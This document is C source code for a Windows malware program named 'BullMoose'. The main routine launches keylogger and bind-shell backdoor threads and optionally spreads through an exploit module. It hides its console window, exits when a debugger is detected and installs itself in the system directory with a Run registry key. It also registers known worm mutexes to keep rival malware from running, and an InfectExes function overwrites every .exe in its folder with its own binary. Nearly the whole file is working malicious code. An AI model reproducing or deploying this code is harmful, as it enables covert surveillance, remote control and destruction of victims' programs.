#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include "config.h"
#include <winsock2.h>
#include <wininet.h>
#ifdef KILL_ANTI_VIRUS
#include <Tlhelp32.h>
#endif
#include "bindshell.c"
#include "keylogger.c"
#ifdef EXPLOIT_SPREAD
#include "exploit.c"
#endif
#ifdef KILL_ANTI_VIRUS
#include "killav.c"
#endif
#ifdef COMPANION_PROC
#include "companion.c"
#endif

#ifdef INSTALL_STARTUP
int Install(char *mypath);
#endif
#ifdef KILL_OTHER_MAL
int NoRivals(void);
#endif
#ifdef INFECT_EXES
int InfectExes(void);
#endif
int main(void)
{
	CreateMutex(NULL,0,ModuleMutex);
	if(GetLastError() == ERROR_ALREADY_EXISTS) return 1;
#ifdef FIU_TECHNIQUE
	char ThisPath[256];
	GetModuleFileName(NULL,ThisPath,sizeof(ThisPath));
	FILE *myfile = fopen(ThisPath,"rb");
#endif
#ifdef ANTI_DEBUGGING
	if(IsDebuggerPresent()) return 0;
#endif
#ifdef WINDOW_STEALTH
	AllocConsole();
	ShowWindow(FindWindowA("ConsoleWindowClass",NULL),0);
#endif

#ifdef KILL_OTHER_MAL
	NoRivals();
#endif
#ifdef COMPANION_PROC
	CreateThread(NULL,0,DropCompanion,NULL,0,NULL);
#endif

#ifdef INSTALL_STARTUP
	Install((char *)&ThisPath);
#endif
	CreateThread(NULL,0,Keylogger,NULL,0,NULL);
	CreateThread(NULL,0,Backdoor,NULL,0,NULL);
#ifdef KILL_ANTI_VIRUS
	CreateThread(NULL,0,NoAntiVirus,NULL,0,NULL);
#endif
#ifdef INFECT_EXES
	InfectExes();
#endif
#ifdef EXPLOIT_SPREAD
	ExploitSpreadMain();
#else
	while(1) ;
#endif
}
#ifdef INSTALL_STARTUP
int Install(char *mypath)
{
	char Path[256];
	GetSystemDirectory(Path,sizeof(Path));
	strcat(Path,"\\BullMoose.exe");
	CopyFile(mypath,Path,FALSE);

	HKEY MyKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_WRITE,&MyKey);
	RegSetValueEx(MyKey,RegFileDes,0,REG_SZ,Path,strlen(Path));
	RegCloseKey(MyKey);
	return 0;
}
#endif
#ifdef KILL_OTHER_MAL
int NoRivals(void)
{
	CreateMutex(NULL,0,"SwebSipcSmtxS0"); // MyDoom
	CreateMutex(NULL,0,"BILLY"); // Blaster
	CreateMutex(NULL,0,"stormfucker"); // Storm Worm
	CreateMutex(NULL,0, "AdmMoodownJKIS003"); // ----Netsky BEGIN-----
	CreateMutex(NULL,0, "(S)(k)(y)(N)(e)(t)");
	CreateMutex(NULL,0, "____--->>>>U<<<<--____");
	CreateMutex(NULL,0, "NetDy_Mutex_Psycho");
	CreateMutex(NULL,0, "_-=oOOSOkOyONOeOtOo=-_");
	CreateMutex(NULL,0, "SyncMutex_USUkUyUnUeUtUU");
	CreateMutex(NULL,0, "SyncMutex_USUkUyUnUeUtU");
	CreateMutex(NULL,0, "Protect_USUkUyUnUeUtU_Mutex");
	CreateMutex(NULL,0, "89845848594808308439858307378280987074387498739847");
	CreateMutex(NULL,0, "_-oOaxX|-+S+-+k+-+y+-+N+-+e+-+t+-|XxKOo-_");
	CreateMutex(NULL,0, "_-oO]xX|-S-k-y-N-e-t-|Xx[Oo-_");
	CreateMutex(NULL,0, "Bgl_*L*o*o*s*e*");
	CreateMutex(NULL,0, "NetDy_Mutex_Psycho");
	CreateMutex(NULL,0, "Rabbo_Mutex");
	CreateMutex(NULL,0, "Rabbo");
	CreateMutex(NULL,0, "SkYnEt_AVP");
	CreateMutex(NULL,0, "KO[SkyNet.cz]SystemsMutex");
	CreateMutex(NULL,0, "MI[SkyNet.cz]SystemsMutex");
	CreateMutex(NULL,0, "Netsky AV Guard");
	CreateMutex(NULL,0, "LK[SkyNet.cz]SystemsMutex");
	CreateMutex(NULL,0, "[SkyNet.cz]SystemsMutex");
	CreateMutex(NULL,0, "AdmSkynetJKIS003"); 
	CreateMutex(NULL,0, "SkyNet-Sasser"); 
	CreateMutex(NULL,0, "S-k-y-n-e-t--A-n-t-i-v-i-r-u-s-T-e-a-m"); 
	CreateMutex(NULL,0, "MuXxXxTENYKSDesignedAsTheFollowerOfSkynet-D"); 
	CreateMutex(NULL,0, "Jobaka3");
	CreateMutex(NULL,0, "Jobaka3l");
	CreateMutex(NULL,0, "JumpallsNlsTillt");
	CreateMutex(NULL,0, "SkynetSasserVersionWithPingFast");
	CreateMutex(NULL,0, "SkynetNotice");
	CreateMutex(NULL,0, "'D'r'o'p'p'e'd'S'k'y'N'e't'");
	CreateMutex(NULL,0,"~~~Bloodred~~~owns~~~you~~~xoxo~~~2004"); // ---- Netsky END ------
	return 0;
}
#endif

#ifdef INFECT_EXES
int InfectExes(void)
{
	char MyFile[256];
	GetModuleFileName(NULL,MyFile,sizeof(MyFile));
	HANDLE hFile;
	WIN32_FIND_DATA w32FileData;
	if((hFile = FindFirstFile("*.exe",&w32FileData))==INVALID_HANDLE_VALUE) return 1;
	else if(w32FileData.cFileName==MyFile) goto up;
	else {
		SetFileAttributes(w32FileData.cFileName,FILE_ATTRIBUTE_NORMAL);
		CopyFile(MyFile,w32FileData.cFileName,FALSE);
up:
		while(FindNextFile(hFile,&w32FileData)!=0) {
			if(w32FileData.cFileName==MyFile) continue;
			else {
				SetFileAttributes(w32FileData.cFileName,FILE_ATTRIBUTE_NORMAL);
				CopyFile(MyFile,w32FileData.cFileName,FALSE);
			}
		}
	}
	return 0;
}
#endif
